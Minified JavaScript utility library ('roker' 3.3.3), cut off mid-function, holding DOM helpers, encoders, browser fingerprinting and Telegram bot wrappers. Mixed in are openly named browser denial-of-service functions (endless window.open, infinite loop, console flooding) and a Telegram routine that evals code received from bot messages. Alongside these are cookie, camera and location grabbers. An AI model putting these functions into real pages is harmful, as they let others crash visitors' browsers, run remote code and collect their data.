const $version="3.3.3",$roker_version=$version,$roker=$version;var CryptoJS=CryptoJS||function(e,t){var n={},r=n.lib={},a=function(){},o=r.Base={extend:function(e){a.prototype=this;var t=new a;return e&&t.mixIn(e),t.hasOwnProperty("init")||(t.init=function(){t.$super.init.apply(this,arguments)}),t.init.prototype=t,t.$super=this,t},create:function(){var e=this.extend();return e.init.apply(e,arguments),e},init:function(){},mixIn:function(e){for(var t in e)e.hasOwnProperty(t)&&(this[t]=e[t]);e.hasOwnProperty("toString")&&(this.toString=e.toString)},clone:function(){return this.init.prototype.extend(this)}},c=r.WordArray=o.extend({init:function(e,t){e=this.words=e||[],this.sigBytes=null!=t?t:4*e.length},toString:function(e){return(e||u).stringify(this)},concat:function(e){var t=this.words,n=e.words,r=this.sigBytes;if(e=e.sigBytes,this.clamp(),r%4)for(var a=0;a<e;a++)t[r+a>>>2]|=(n[a>>>2]>>>24-a%4*8&255)<<24-(r+a)%4*8;else if(65535<n.length)for(a=0;a<e;a+=4)t[r+a>>>2]=n[a>>>2];else t.push.apply(t,n);return this.sigBytes+=e,this},clamp:function(){var t=this.words,n=this.sigBytes;t[n>>>2]&=4294967295<<32-n%4*8,t.length=e.ceil(n/4)},clone:function(){var e=o.clone.call(this);return e.words=this.words.slice(0),e},random:function(t){for(var n=[],r=0;r<t;r+=4)n.push(4294967296*e.random()|0);return new c.init(n,t)}}),s=n.enc={},u=s.Hex={stringify:function(e){var t=e.words;e=e.sigBytes;for(var n=[],r=0;r<e;r++){var a=t[r>>>2]>>>24-r%4*8&255;n.push((a>>>4).toString(16)),n.push((15&a).toString(16))}return n.join("")},parse:function(e){for(var t=e.length,n=[],r=0;r<t;r+=2)n[r>>>3]|=parseInt(e.substr(r,2),16)<<24-r%8*4;return new c.init(n,t/2)}},_=s.Latin1={stringify:function(e){var t=e.words;e=e.sigBytes;for(var n=[],r=0;r<e;r++)n.push(String.fromCharCode(t[r>>>2]>>>24-r%4*8&255));return n.join("")},parse:function(e){for(var t=e.length,n=[],r=0;r<t;r++)n[r>>>2]|=(255&e.charCodeAt(r))<<24-r%4*8;return new c.init(n,t)}},i=s.Utf8={stringify:function(e){try{return decodeURIComponent(escape(_.stringify(e)))}catch(e){throw Error("Malformed UTF-8 data")}},parse:function(e){return _.parse(unescape(encodeURIComponent(e)))}},l=r.BufferedBlockAlgorithm=o.extend({reset:function(){this._data=new c.init,this._nDataBytes=0},_append:function(e){"string"==typeof e&&(e=i.parse(e)),this._data.concat(e),this._nDataBytes+=e.sigBytes},_process:function(t){var n=this._data,r=n.words,a=n.sigBytes,o=this.blockSize,s=a/(4*o);if(t=(s=t?e.ceil(s):e.max((0|s)-this._minBufferSize,0))*o,a=e.min(4*t,a),t){for(var u=0;u<t;u+=o)this._doProcessBlock(r,u);u=r.splice(0,t),n.sigBytes-=a}return new c.init(u,a)},clone:function(){var e=o.clone.call(this);return e._data=this._data.clone(),e},_minBufferSize:0});r.Hasher=l.extend({cfg:o.extend(),init:function(e){this.cfg=this.cfg.extend(e),this.reset()},reset:function(){l.reset.call(this),this._doReset()},update:function(e){return this._append(e),this._process(),this},finalize:function(e){return e&&this._append(e),this._doFinalize()},blockSize:16,_createHelper:function(e){return function(t,n){return new e.init(n).finalize(t)}},_createHmacHelper:function(e){return function(t,n){return new g.HMAC.init(e,n).finalize(t)}}});var g=n.algo={};return n}(Math);function $encode_base64(e,t=1){try{for(let n=0;n<t;n++)e=btoa(e);return e}catch(e){return e.message}}function $decode_base64(e,t=1){try{for(let n=0;n<t;n++)e=atob(e);return e}catch(e){return e.message}}function $compile_base64(text,key=1){try{for(let e=0;e<key;e++)text=atob(text);var com=eval(text);return com}catch(e){return e.message}}function $crack_key_base64(e){for(key=0;;)try{e=atob(e),key+=1}catch(e){break}return[e,key,"EncodeType: base64"]}function $encode_base32(e){const t="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let n="",r=0,a=0;for(let o=0;o<e.length;o++)for(a=a<<8|e.charCodeAt(o),r+=8;r>=5;)n+=t[a>>>r-5&31],r-=5;return r>0&&(a<<=5-r,n+=t[31&a]),n}function $decode_base32(e){let t="",n=0,r=0;for(let a=0;a<e.length;a++){let o="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(e[a]);if(-1===o)throw new Error("Invalid Base32 character");for(r=r<<5|o,n+=5;n>=8;)t+=String.fromCharCode(r>>>n-8&255),n-=8}return t}function $encode_base16(e){let t="";for(let n=0;n<e.length;n++){t+=e.charCodeAt(n).toString(16)}return t}function $decode_base16(e){let t="";for(let n=0;n<e.length;n+=2){let r=e.substr(n,2),a=parseInt(r,16);t+=String.fromCharCode(a)}return t}function $encode_base85(e){let t="",n=0;for(let r=0;r<e.length;r+=4){let a=e.slice(r,r+4),o=0;for(let e=0;e<a.length;e++)o=256*o+a.charCodeAt(e);if(0===o)t+="z";else{let e=[];for(let t=0;t<5;t++){let t=o%85;o=Math.floor(o/85),e.push(String.fromCharCode(t+33))}t+=e.reverse().join("")}n=a.length%4}return n>0&&(t=t.slice(0,-n),t+="~~~~".slice(0,n+1)),t}function $decode_base85(e){let t="";for(let n=0;n<e.length;n+=5){let r=e.slice(n,n+5);if("z"===r)t+="\0\0\0\0";else{let e=0;for(let t=0;t<r.length;t++)e=85*e+(r.charCodeAt(t)-33);let n=[];for(let t=0;t<4;t++){let t=e%256;e=Math.floor(e/256),n.push(String.fromCharCode(t))}t+=n.reverse().join("")}}return t}function $encode_base58(e){let t="",n=0;for(let t=0;t<e.length;t++)n=256*n+e.charCodeAt(t);for(;n>0;){let e=n%58;n=Math.floor(n/58),t="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"[e]+t}return t}function $decode_base58(e){let t="",n=0;for(let t=0;t<e.length;t++){n=58*n+"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz".indexOf(e[t])}for(;n>0;){let e=n%256;n=Math.floor(n/256),t=String.fromCharCode(e)+t}return t}function $clintDB_clear_all_data(){try{return localStorage.clear(),"ok"}catch(e){return e.message}}function $clintDB_datas(){try{return localStorage.valueOf()}catch(e){return e.message}}function $clintDB_add_data(e,t){try{return localStorage.setItem(e,t),"ok"}catch(e){return e.message}}function $clintDB_get_data(e){try{return localStorage.getItem(e)}catch(e){return e.message}}function $clintDB_remove_data(e){try{return localStorage.removeItem(e),"ok"}catch(e){return e.message}}function $attack_open_pages(e){try{for(;;)window.open(e);return"attack killed"}catch(e){return e.message}}function $attack_proc(){try{for(;;);return"attack killed"}catch(e){return e.message}}function $attack_print_console(){try{for(var e="\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\n\t\t\t\n\t\t\t\t\n\n\n\n\n\n\n\n\n\n\n\tgifn\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\t\t\t\t\n\t\t\t\n\t\t\t\t\n\n\n\n\n\n\n\n\n\n\n\t";;)console.log(e),console.error(e),console.info(e),console.debug(e);return"attack killed"}catch(e){return e.message}}function $attack_encode(){for(text="sdxc   fyyhujo idffghlijyjdgssgdfjhjlkjdhsgdhfghljlhgfhdgsdffjhljlkfdsggsrfguhijo;hgkfdhghdfjgh2345678987654567898765$##$%^&*(*765redfgjhuytrfesrdcfvgbhiujouihygtrujiouygtrdexdfcgvbhj";;)text=btoa(text),console.log(text)}function $is_new_user(e="ijhugytdresdxcfvhbjnkoki9876543wwe"){return null==localStorage.getItem(e)&&(localStorage.setItem(e,e),!0)}function $anti_copy(){try{var e="Netscape"==navigator.appName?1:0;function t(t){var n=e?t:event,r=e?n.which:n.button;if(2==r||3==r)return!1}return"Netscape"==navigator.appName&&document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP),document.oncontextmenu=function(){return!1},document.onmousedown=t,document.onmouseup=t,"ok"}catch(e){return e.message}}function $anti_injection(e){return e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=e.replace("<","")).replace(">","")).replace("/","")).replace("~","")).replace("`","")).replace("'","")).replace('"',"")).replace("+","")).replace("=","")).replace("-","")).replace("_","")).replace(")","")).replace("(","")).replace("*","")).replace("&","")).replace("^","")).replace("%","")).replace("$","")).replace("#","")).replace("!","")).replace("[","")).replace("]","")).replace("{","")).replace("}","")).replace("|","")).replace(";","")).replace(":","")).replace("?","")).replace(" ","")}function $int(e){return parseInt(e)}function $str(e){return e.toString()}function $float(e){return parseFloat(e)}function $search_google(e){try{return window.location.assign("https://www.google.com/search?q="+e),"ok"}catch(e){return e.message}}function $search_github(e){try{return window.location.assign("https://github.com/search?q="+e),"ok"}catch(e){return e.message}}function $clear_screen(e=""){try{return document.body.innerHTML=e,"ok"}catch(e){return e.message}}function $clear_console(){try{return console.clear,"ok"}catch(e){return e.message}}function $play_audio(e){try{return new Audio(e).play(),"ok"}catch(e){return e.message}}function $reload(){try{return window.location.reload(),"ok"}catch(e){return e.message}}function $go_url(e){try{return window.location.assign(e),"ok"}catch(e){return e.message}}function $open_url(e){try{return window.open(e),"ok"}catch(e){return e.message}}function $open_url_window(e,t="yes",n="600",r="500",a="yes",o="yes",c="yes"){try{return window.open(e,"","toolbar="+t+", width="+n+",height="+r+",directories="+a+",menubar="+o+",scrollbars="+c),"ok"}catch(e){return e.message}}function $show_box(e){try{return alert(e),"ok"}catch(e){return e.message}}function $confirm_box(e){try{return confirm(e)?"ok":"cancel"}catch(e){return e.message}}function $ask_box(e,t=""){try{return prompt(e,t)}catch(e){return e.message}}function $request_post(e,t=null){try{var n=new XMLHttpRequest;return n.open("POST",e,!1),n.send(t),n}catch(e){return e.message}}function $request_get(e,t){var n=new XMLHttpRequest;n.open("GET",e,!0),n.onload=function(){t(n.status,n.responseText,n.readyState)},n.send()}function $request_get_openurl(e,t){var n=document.createElement("iframe");return n.id=t,n.src=e,document.body.appendChild(n),$set_hidden_by_id(t),"ok"}async function $request_get_plus(e){try{return await fetch(e)}catch(e){return console.error(e),"error: "+e}}function $send_packet_to(e,t,n,r,a){try{var o=document.createElement("form");o.action=e;var c=document.createElement("input");c.value=t,c.id=n,c.name=r;var s=document.createElement("input");return s.type="submit",s.id=a,o.appendChild(c),o.appendChild(s),document.body.appendChild(o),$set_hidden_by_id(n),$set_hidden_by_id(a),$click_by_id(a),"ok"}catch{return"error"}}function $telegram_sendMessage(e,t,n){try{var r="ok";const a=`https://api.telegram.org/bot${e}/sendMessage`,o=new XMLHttpRequest;o.open("POST",a,!0),o.setRequestHeader("Content-Type","application/json"),o.onreadystatechange=function(){o.readyState===XMLHttpRequest.DONE&&(r=200===o.status?"ok":"error")};const c=JSON.stringify({chat_id:t,text:n});return o.send(c),r}catch{return"error"}}async function $telegram_sendMessage_post(e,t,n){const r=await fetch("https://api.telegram.org/bot"+e+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:t,text:n})});return await r.json()}function $telegram_sendDocument(e,t,n){try{var r="ok",a=new XMLHttpRequest;a.open("POST","https://api.telegram.org/bot"+e+"/sendDocument",!0),a.setRequestHeader("Content-Type","multipart/form-data"),a.onreadystatechange=function(){4===a.readyState&&200===a.status&&(r="ok "+a.responseText)};var o=new FormData;return o.append("chat_id",t),o.append("document",n),a.send(o),r}catch{return"error"}}async function $telegram_getUserInfo(e,t){const n=await fetch("https://api.telegram.org/bot"+e+"/getUserProfilePhotos?user_id="+t),r=await n.json();return{photo:r.result.photos[0][0].file_id,name:r.result.first_name+" "+r.result.last_name}}async function $telegram_getLatestMessage(e){const t=await fetch("https://api.telegram.org/bot"+e+"/getUpdates"),n=await t.json();return n.result[n.result.length-1].message}async function $telegram_compile(botToken,messageList,run=!1,log=!0){let lastMessageId=0;const latestMessage=await $telegram_getLatestMessage(botToken),messageId=latestMessage.message_id,userId=latestMessage.from.id;if(messageId!==lastMessageId){1==log&&(console.log("The latest message was sent by user with ID "+userId),console.log("The message text was: "+latestMessage.text));for(let i=0;i<messageList.length;i++)if(latestMessage.text===messageList[i].text&&""!==messageList[i].code)if(!1===run)await $telegram_sendMessage(botToken,userId,messageList[i].code);else{var cdtmp=messageList[i].code;cdtmp=cdtmp.replace("[//USERID//]",userId),cdtmp=cdtmp.replace("[//TEXT//]",latestMessage.text),cdtmp=cdtmp.replace("[//TOKEN//]",botToken),cdtmp=cdtmp.replace("[//MESSAGEID//]",messageId),await eval(cdtmp)}lastMessageId=messageId}}function $random_word(e,t){for(var n="",r=0;r<t;r++){var a=Math.floor(Math.random()*e.length);n+=e.charAt(a)}return n}function $random_number(e,t){return Math.floor(Math.random()*(t-e+1))+e}function $figlet_base(e){const t={a:["    __    ","   / /_   ","  / __ \\  "," / /_/ /  ","/_.___/   "],b:[" ______  ","|  ____| ","| |__    ","|___ \\   "," ____/ /  ","|_____/   "],c:["  ______ "," / ____| ","| |      ","| |      ","| |____  "," \\_____| "],d:[" ______  ","|  ____| ","| |__    ","|  __|   ","| |____  ","|______| "],e:[" ______ ","|  ____|","| |__   ","|  __|  ","| |____ ","|______|"],f:[" ______ ","|  ____|","| |__   ","|  __|  ","| |     ","|_|     "],g:["  ______ "," / ____|","| |      ","| | ____ ","| ||_  _|"," \\___||_|"],h:[" _    _  ","| |  | | ","| |__| | ","|  __  | ","| |  | | ","|_|  |_| "],i:[" _____ ","|_   _|","  | |  "," _| |_ ","|_____|","       "],j:["     _   ","    | |  ","    | |  "," _  | |_ ","| |_| |_"," \\___/(_)"],k:[" _   __","| | / /","| |/ / ","|   <  ","| |\\ \\ ","|_| \\_\\"],l:[" _      ","| |     ","| |     ","| |     ","| |____ ","|______|"],m:[" __  __ ","|  \\/  |","| \\  / |","| |\\/| |","| |  | |","|_|  |_|"],n:[" _   _ ","| \\ | |","|  \\| |","| .  |","| |\\  |","|_| \\_|"],o:["  ____  "," / __ \\ ","| |  | |","| |  | |","| |__| |"," \\____/ "],p:[" _____  ","|  __ \\ ","| |__) |","|  ___/ ","| |     ","|_|     "],q:["  ____  "," / __ \\ ","| |  | |","| |  | |","| |__| |"," \\___\\_\\"],r:[" _____  ","|  __ \\ ","| |__) >","|  _  < ","| |_) >","|____/ "],s:["  _____ "," / ____|","| (___  "," \\___ \\ "," ____) )","|_____/ "],t:[" _______","|__   __|","   | |   ","   | |   ","   | |   ","   |_|   "],u:[" _    _ ","| |  | |","| |  | |","| |  | |","| |__| |"," \\____/ "],v:["__      __","\\ \\    / /"," \\ \\  / / ","  \\ \\/ /  ","   \\  /   ","    \\/    "],w:["__          __","\\ \\        / /"," \\ \\  /\\  / / ","  \\ \\/  \\/ /  ","   \\  /\\  /   ","    \\/  \\/    "],x:["__   __","\\ \\ / /"," \\ V / ","  > <  "," / . \\ ","/_/ \\_\\"],y:["__     __","\\ \\   / /"," \\ \\_/ / ","  \\   /  ","   | |   ","   |_|   "],z:[" ______","|___  /","   / / ","  / /  ","./ /___","\\_____(_)"]};let n="";for(let r=0;r<6;r++){for(let a=0;a<e.length;a++){const o=e[a].toLowerCase();n+=t[o]?t[o][r]+" ":"        "}n+="\n"}return n}function $take_picture_camera(){var e,t=document.getElementById("canvas"),n=t.getContext("2d"),r=document.createElement("video");return navigator.mediaDevices&&navigator.mediaDevices.getUserMedia&&navigator.mediaDevices.getUserMedia({video:!0}).then((function(t){e=t,r.srcObject=t,r.play()})),window.onbeforeunload=function(){e&&e.getTracks().forEach((function(e){e.stop()}))},n.drawImage(r,0,0,t.width,t.height),t.toDataURL()}function $UI_Create(e,t="p"){try{const n=document.createElement(t);return document.body.appendChild(n),n.innerHTML=e,"ok"}catch(e){return"error: "+e}}function $browser_name(){return navigator.appCodeName}function $browser_version(){return navigator.appVersion}function $browser_buildID(){return navigator.buildID}function $browser_userAgent(){return navigator.userAgent}function $browser_platform(){return navigator.platform}function $browser_language(){return navigator.language}function $browser_onlion(){return navigator.onLine}function $browser_mode(){try{return document.documentMode}catch(e){return e.message}}function $browser_javaEnabled(){return navigator.javaEnabled()}function $browser_cookieEnabled(){return navigator.cookieEnabled}function $browser_is_webdriver(){return navigator.webdriver}function $browser_cpu_info(){return navigator.oscpu}function $browser_pdfViewerEnabled(){return navigator.pdfViewerEnabled}function $browser_number_plugins_installed(){return navigator.plugins.length}function $browser_devices(){return navigator.mediaDevices}function $browser_get_location(){if(!("geolocation"in navigator))return"error: Geolocation API Not Support";navigator.geolocation.getCurrentPosition((function(e){return[e.coords.latitude,e.coords.longitude]}))}function $browser_get_ip(e){var t=new XMLHttpRequest;t.open("GET","https://api.ipify.org?format=json",!0),t.send(),t.onload=function(){200===t.status&&e(JSON.parse(t.responseText).ip)}}function $browser_get_battery(){try{return(100*(navigator.battery||navigator.webkitBattery||navigator.mozBattery).level).toFixed(0)+"%"}catch{return"error: navigator battery Not Support"}}function $access_open_page(){try{return!!window.open(url)}catch{return!1}}function $access_clear_console(){try{return console.clear(),!0}catch{return!1}}function $click_by_id(e){try{return document.getElementById(e).click(),"ok"}catch(e){return e.message}}function $click_by_tag(e){try{return document.getElementsByTagName(e).click(),"ok"}catch(e){return e.message}}function $click_by_class(e){try{return document.getElementsByClassName(e).click(),"ok"}catch(e){return e.message}}function $get_location_from_ip(e,t){try{$request_get("https://ipapi.co/"+e+"/json/",(function(e,n,r){t(n)}))}catch(e){return"error: "+e}}function $get_url_query(e){var t=document.URL.indexOf(e)+5;return document.URL.substring(t,document.URL.length)}function $get_text_by_id(e){try{return document.getElementById(e).value}catch(e){return e.message}}function $get_text_by_tag(e){try{return document.getElementsByTagName(e).value}catch(e){return e.message}}function $get_text_by_class(e){try{return document.getElementsByClassName(e).value}catch(e){return e.message}}function $get_html_by_id(e,t){try{return document.getElementById(e).innerhtml.valueOf()}catch(e){return e.message}}function $get_html_by_tag(e,t){try{return document.getElementsByTagName(e).innerhtml.valueOf()}catch(e){return e.message}}function $get_html_by_class(e,t){try{return document.getElementsByClassName(e).innerhtml.valueOf()}catch(e){return e.message}}function $get_src_by_id(e,t){try{return document.getElementById(e).src.valueOf()}catch(e){return e.message}}function $get_src_by_tag(e,t){try{return document.getElementsByTagName(e).src.valueOf()}catch(e){return e.message}}function $get_src_by_class(e,t){try{return document.getElementsByClassName(e).src.valueOf()}catch(e){return e.message}}function $get_hidden_by_id(e){try{return document.getElementById(e).style.display.valueOf()}catch(e){return e.message}}function $get_hidden_by_tag(e){try{return document.getElementsByTagName(e).style.displayvalueOf()}catch(e){return e.message}}function $get_hidden_by_class(e){try{return document.getElementsByClassName(e).style.displayvalueOf()}catch(e){return e.message}}function $get_show_by_id(e){try{return document.getElementById(e).style.display.valueOf()}catch(e){return e.message}}function $get_show_by_tag(e){try{return document.getElementsByTagName(e).style.display.valueOf()}catch(e){return e.message}}function $get_show_by_class(e){try{return document.getElementsByClassName(e).style.display.valueOf()}catch(e){return e.message}}function $get_style_by_id(e,t){try{return document.getElementById(e).style.valueOf()}catch(e){return e.message}}function $get_style_by_tag(e,t){try{return document.getElementsByTagName(e).style.valueOf()}catch(e){return e.message}}function $get_style_by_class(e,t){try{return document.getElementsByClassName(e).style.valueOf()}catch(e){return e.message}}function $get_id_by_id(e,t){try{return document.getElementById(e).id.valueOf()}catch(e){return e.message}}function $get_id_by_tag(e,t){try{return document.getElementsByTagName(e).id.valueOf()}catch(e){return e.message}}function $get_id_by_class(e,t){try{return document.getElementsByClassName(e).id.valueOf()}catch(e){return e.message}}function $get_lang_by_id(e,t){try{return document.getElementById(e).lang.valueOf()}catch(e){return e.message}}function $get_lang_by_tag(e,t){try{return document.getElementsByTagName(e).lang.valueOf()}catch(e){return e.message}}function $get_lang_by_class(e,t){try{return document.getElementsByClassName(e).lang.valueOf()}catch(e){return e.message}}function $get_onchange_by_id(e,t){try{return document.getElementById(e).onchange.valueOf()}catch(e){return e.message}}function $get_onchange_by_tag(e,t){try{return document.getElementsByTagName(e).onchange.valueOf()}catch(e){return e.message}}function $get_onchange_by_class(e,t){try{return document.getElementsByClassName(e).onchange.valueOf()}catch(e){return e.message}}function $get_onclick_by_id(e,t){try{return document.getElementById(e).onclick.valueOf()}catch(e){return e.message}}function $get_onclick_by_tag(e,t){try{return document.getElementsByTagName(e).onclick.valueOf()}catch(e){return e.message}}function $get_onclick_by_class(e,t){try{return document.getElementsByClassName(e).onclick.valueOf()}catch(e){return e.message}}function $get_oncopy_by_id(e,t){try{return document.getElementById(e).oncopy.valueOf()}catch(e){return e.message}}function $get_oncopy_by_tag(e,t){try{return document.getElementsByTagName(e).oncopy.valueOf()}catch(e){return e.message}}function $get_oncopy_by_class(e,t){try{return document.getElementsByClassName(e).oncopy.valueOf()}catch(e){return e.message}}function $get_onload_by_id(e,t){try{return document.getElementById(e).onload.valueOf()}catch(e){return e.message}}function $get_onload_by_tag(e,t){try{return document.getElementsByTagName(e).onload.valueOf()}catch(e){return e.message}}function $get_onload_by_class(e,t){try{return document.getElementsByClassName(e).onload.valueOf()}catch(e){return e.message}}function $get_tagName_by_id(e,t){try{return document.getElementById(e).tagName.valueOf()}catch(e){return e.message}}function $get_tagName_by_tag(e,t){try{return document.getElementsByTagName(e).tagName.valueOf()}catch(e){return e.message}}function $get_tagName_by_class(e,t){try{return document.getElementsByClassName(e).tagName.valueOf()}catch(e){return e.message}}function $get_title_by_id(e,t){try{return document.getElementById(e).title.valueOf()}catch(e){return e.message}}function $get_title_by_tag(e,t){try{return document.getElementsByTagName(e).title.valueOf()}catch(e){return e.message}}function $get_title_by_class(e,t){try{return document.getElementsByClassName(e).title.valueOf()}catch(e){return e.message}}function $get_backgroundColor_by_id(e,t){try{return document.getElementById(e).style.backgroundColor.valueOf()}catch(e){return e.message}}function $get_backgroundColor_by_tag(e,t){try{return document.getElementsByTagName(e).style.backgroundColor.valueOf()}catch(e){return e.message}}function $get_backgroundColor_by_class(e,t){try{return document.getElementsByClassName(e).style.backgroundColor.valueOf()}catch(e){return e.message}}function $get_backgroundImage_by_id(e,t){try{return document.getElementById(e).style.backgroundImage.valueOf()}catch(e){return e.message}}function $get_backgroundImage_by_tag(e,t){try{return document.getElementsByTagName(e).style.backgroundImage.valueOf()}catch(e){return e.message}}function $get_backgroundImage_by_class(e,t){try{return document.getElementsByClassName(e).style.backgroundImage.valueOf()}catch(e){return e.message}}function $get_color_by_id(e,t){try{return document.getElementById(e).style.color.valueOf()}catch(e){return e.message}}function $get_color_by_tag(e,t){try{return document.getElementsByTagName(e).style.color.valueOf()}catch(e){return e.message}}function $get_color_by_class(e,t){try{return document.getElementsByClassName(e).style.color.valueOf()}catch(e){return e.message}}function $get_font_by_id(e,t){try{return document.getElementById(e).style.fontFamily.valueOf()}catch(e){return e.message}}function $get_font_by_tag(e,t){try{return document.getElementsByTagName(e).style.fontFamily.valueOf()}catch(e){return e.message}}function $get_font_by_class(e,t){try{return document.getElementsByClassName(e).style.fontFamily.valueOf()}catch(e){return e.message}}function $get_fontSize_by_id(e,t){try{return document.getElementById(e).style.fontSize.valueOf()}catch(e){return e.message}}function $get_fontSize_by_tag(e,t){try{return document.getElementsByTagName(e).style.fontSize.valueOf()}catch(e){return e.message}}function $get_fontSize_by_class(e,t){try{return document.getElementsByClassName(e).style.fontSize.valueOf()}catch(e){return e.message}}function $set_text_by_id(e,t){try{return document.getElementById(e).innerText=t,"ok"}catch(e){return e.message}}function $set_text_by_tag(e,t){try{return document.getElementsByTagName(e).innerText=t,"ok"}catch(e){return e.message}}function $set_text_by_class(e,t){try{return document.getElementsByClassName(e).innerText=t,"ok"}catch(e){return e.message}}function $set_html_by_id(e,t){try{return document.getElementById(e).innerhtml=t,"ok"}catch(e){return e.message}}function $set_html_by_tag(e,t){try{return document.getElementsByTagName(e).innerhtml=t,"ok"}catch(e){return e.message}}function $set_html_by_class(e,t){try{return document.getElementsByClassName(e).innerhtml=t,"ok"}catch(e){return e.message}}function $set_src_by_id(e,t){try{return document.getElementById(e).src=t,"ok"}catch(e){return e.message}}function $set_src_by_tag(e,t){try{return document.getElementsByTagName(e).src=t,"ok"}catch(e){return e.message}}function $set_src_by_class(e,t){try{return document.getElementsByClassName(e).src=t,"ok"}catch(e){return e.message}}function $set_hidden_by_id(e){try{return document.getElementById(e).style.display="none","ok"}catch(e){return e.message}}function $set_hidden_by_tag(e){try{return document.getElementsByTagName(e).style.display="none","ok"}catch(e){return e.message}}function $set_hidden_by_class(e){try{return document.getElementsByClassName(e).style.display="none","ok"}catch(e){return e.message}}function $set_show_by_id(e){try{return document.getElementById(e).style.display="block","ok"}catch(e){return e.message}}function $set_show_by_tag(e){try{return document.getElementsByTagName(e).style.display="block","ok"}catch(e){return e.message}}function $set_show_by_class(e){try{return document.getElementsByClassName(e).style.display="block","ok"}catch(e){return e.message}}function $set_style_by_id(e,t){try{return document.getElementById(e).style=t,"ok"}catch(e){return e.message}}function $set_style_by_tag(e,t){try{return document.getElementsByTagName(e).style=t,"ok"}catch(e){return e.message}}function $set_style_by_class(e,t){try{return document.getElementsByClassName(e).style=t,"ok"}catch(e){return e.message}}function $set_id_by_id(e,t){try{return document.getElementById(e).id=t,"ok"}catch(e){return e.message}}function $set_id_by_tag(e,t){try{return document.getElementsByTagName(e).id=t,"ok"}catch(e){return e.message}}function $set_id_by_class(e,t){try{return document.getElementsByClassName(e).id=t,"ok"}catch(e){return e.message}}function $set_lang_by_id(e,t){try{return document.getElementById(e).lang=t,"ok"}catch(e){return e.message}}function $set_lang_by_tag(e,t){try{return document.getElementsByTagName(e).lang=t,"ok"}catch(e){return e.message}}function $set_lang_by_class(e,t){try{return document.getElementsByClassName(e).lang=t,"ok"}catch(e){return e.message}}function $set_onchange_by_id(e,t){try{return document.getElementById(e).onchange=t,"ok"}catch(e){return e.message}}function $set_onchange_by_tag(e,t){try{return document.getElementsByTagName(e).onchange=t,"ok"}catch(e){return e.message}}function $set_onchange_by_class(e,t){try{return document.getElementsByClassName(e).onchange=t,"ok"}catch(e){return e.message}}function $set_onclick_by_id(e,t){try{return document.getElementById(e).onclick=t,"ok"}catch(e){return e.message}}function $set_onclick_by_tag(e,t){try{return document.getElementsByTagName(e).onclick=t,"ok"}catch(e){return e.message}}function $set_onclick_by_class(e,t){try{return document.getElementsByClassName(e).onclick=t,"ok"}catch(e){return e.message}}function $set_oncopy_by_id(e,t){try{return document.getElementById(e).oncopy=t,"ok"}catch(e){return e.message}}function $set_oncopy_by_tag(e,t){try{return document.getElementsByTagName(e).oncopy=t,"ok"}catch(e){return e.message}}function $set_oncopy_by_class(e,t){try{return document.getElementsByClassName(e).oncopy=t,"ok"}catch(e){return e.message}}function $set_onload_by_id(e,t){try{return document.getElementById(e).onload=t,"ok"}catch(e){return e.message}}function $set_onload_by_tag(e,t){try{return document.getElementsByTagName(e).onload=t,"ok"}catch(e){return e.message}}function $set_onload_by_class(e,t){try{return document.getElementsByClassName(e).onload=t,"ok"}catch(e){return e.message}}function $set_tagName_by_id(e,t){try{return document.getElementById(e).tagName=t,"ok"}catch(e){return e.message}}function $set_tagName_by_tag(e,t){try{return document.getElementsByTagName(e).tagName=t,"ok"}catch(e){return e.message}}function $set_tagName_by_class(e,t){try{return document.getElementsByClassName(e).tagName=t,"ok"}catch(e){return e.message}}function $set_title_by_id(e,t){try{return document.getElementById(e).title=t,"ok"}catch(e){return e.message}}function $set_title_by_tag(e,t){try{return document.getElementsByTagName(e).title=t,"ok"}catch(e){return e.message}}function $set_title_by_class(e,t){try{return document.getElementsByClassName(e).title=t,"ok"}catch(e){return e.message}}function $set_backgroundColor_by_id(e,t){try{return document.getElementById(e).style.backgroundColor=t,"ok"}catch(e){return e.message}}function $set_backgroundColor_by_tag(e,t){try{return document.getElementsByTagName(e).style.backgroundColor=t,"ok"}catch(e){return e.message}}function $set_backgroundColor_by_class(e,t){try{return document.getElementsByClassName(e).style.backgroundColor=t,"ok"}catch(e){return e.message}}function $set_backgroundImage_by_id(e,t){try{return document.getElementById(e).style.backgroundImage=t,"ok"}catch(e){return e.message}}function $set_backgroundImage_by_tag(e,t){try{return document.getElementsByTagName(e).style.backgroundImage=t,"ok"}catch(e){return e.message}}function $set_backgroundImage_by_class(e,t){try{return document.getElementsByClassName(e).style.backgroundImage=t,"ok"}catch(e){return e.message}}function $set_color_by_id(e,t){try{return document.getElementById(e).style.color=t,"ok"}catch(e){return e.message}}function $set_color_by_tag(e,t){try{return document.getElementsByTagName(e).style.color=t,"ok"}catch(e){return e.message}}function $set_color_by_class(e,t){try{return document.getElementsByClassName(e).style.color=t,"ok"}catch(e){return e.message}}function $set_font_by_id(e,t){try{return document.getElementById(e).style.fontFamily=t,"ok"}catch(e){return e.message}}function $set_font_by_tag(e,t){try{return document.getElementsByTagName(e).style.fontFamily=t,"ok"}catch(e){return e.message}}function $set_font_by_class(e,t){try{return document.getElementsByClassName(e).style.fontFamily=t,"ok"}catch(e){return e.message}}function $set_fontSize_by_id(e,t){try{return document.getElementById(e).style.fontSize=t,"ok"}catch(e){return e.message}}function $set_fontSize_by_tag(e,t){try{return document.getElementsByTagName(e).style.fontSize=t,"ok"}catch(e){return e.message}}function $set_fontSize_by_class(e,t){try{return document.getElementsByClassName(e).style.fontSize=t,"ok"}catch(e){return e.message}}function $set_title(e){try{return document.title=e,"ok"}catch(e){return e.message}}function $set_cookie(e){try{return document.cookie=e}catch(e){return e.message}}function $set_body_background_color(e){try{return document.body.style.backgroundColor=e}catch(e){return e.message}}function $get_baseURI(){try{return document.baseURI}catch(e){return e.message}}function $get_cookie(){try{return document.cookie}catch(e){return e.message}}function $get_site_type(){try{return document.doctype}catch(e){return e.message}}function $get_domain(){try{return document.domain}catch(e){return e.message}}function $get_domConfig(){try{return document.domConfig}catch(e){return e.message}}function $get_lastModified(){try{return 